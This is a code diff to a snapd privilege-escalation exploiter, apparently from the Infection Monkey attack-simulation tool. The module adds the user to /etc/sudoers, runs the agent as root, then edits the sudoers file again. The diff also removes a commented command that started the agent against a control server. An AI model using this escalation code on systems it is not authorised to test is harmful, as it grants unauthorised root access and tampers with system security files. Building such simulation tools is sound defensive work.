@@ -14,6 +14,7 @@ import subprocess
 from logging import getLogger
 from infection_monkey.pe import HostPrivExploiter
 from infection_monkey.model import REMOVE_LASTLINE, ADDUSER_TO_SUDOERS
+from infection_monkey.pe.tools import check_if_sudoer
 
 LOG = getLogger(__name__)
 
@@ -208,25 +209,29 @@ class snapdExploiter(HostPrivExploiter):
 
         # add the user to the sudo group
         runMonkeyAsRoot = ADDUSER_TO_SUDOERS % {'user_name' : whoami}
-        runCommandAsRoot(runMonkeyAsRoot)
+        # runCommandAsRoot(runMonkeyAsRoot)
 
+        # check if exploit is successful
+
+        if not check_if_sudoer():
+            return False
 
         # now run the monkey as root
-        #cmdline = "sudo /home/imonkey/Documents/GitHub/monkey/monkey/infection_monkey/dist/Monkey m0nk3y -s 192.168.1.217:5000"
+
         LOG.info("Running the monkey as root ")
         command = "sudo "+ command
         monkey_process = subprocess.Popen(command, shell=True,
                                           stdin=None, stdout=None, stderr=None,
                                           close_fds=True, creationflags=0)
 
-        LOG.info("Executed monkey process (PID=%d) with command line: %s",
+        LOG.info("Executed monkey process as root with (PID=%d) with command line: %s",
                  monkey_process.pid, command)
 
         # now remove the user from sudoers
         LOG.info("Removing the current user %s from the sudoers list", whoami)
 
-        removesudoers = REMOVE_LASTLINE % {'file_name' : "/etc/sudoers"}
-        monkey_process = subprocess.Popen(removesudoers, shell=True,
+        removeFromSudoers = REMOVE_LASTLINE % {'file_name' : "/etc/sudoers"}
+        monkey_process = subprocess.Popen(removeFromSudoers, shell=True,
                                           stdin=None, stdout=None, stderr=None,
                                           close_fds=True, creationflags=0)
         return True
